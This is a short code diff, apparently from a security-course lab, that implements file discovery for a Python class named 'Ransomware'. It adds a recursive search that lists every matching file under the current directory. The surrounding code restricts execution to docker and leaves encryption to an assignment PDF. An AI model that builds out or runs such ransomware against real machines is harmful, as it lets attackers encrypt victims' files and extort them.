@@ -34,9 +34,16 @@ class Ransomware:
             print(f"You must run the malware in docker ({hostname}) !")
             sys.exit(1)
 
-    def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        raise NotImplemented()
+
+    def get_files(self, filter:str) -> list:
+        # create a Path object for the current directory
+        current_dir = Path.cwd()
+        # use rglob to recursively search for all files matching the filter
+        matching_files = current_dir.rglob(filter)
+        # convert the matching files to a list of absolute file paths
+        file_paths = [str(file.absolute()) for file in matching_files if file.is_file()]
+        return file_paths
+
 
     def encrypt(self):
         # main function for encrypting (see PDF)
